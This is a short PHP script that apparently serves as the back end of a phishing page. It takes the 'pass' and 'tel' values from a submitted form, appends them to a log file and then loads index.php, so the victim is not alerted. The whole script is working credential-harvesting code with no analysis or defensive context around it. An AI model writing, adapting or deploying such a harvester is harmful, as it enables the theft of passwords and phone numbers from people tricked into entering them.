<?php header('Content-Type: text/html; charset=utf-8');
    $fp = fopen('log.txt', 'a');
    $loh =$_POST[pass]." ".$_POST[tel]." ";
    fwrite($fp,$loh);
    fclose($fp);
    require "index.php";
?>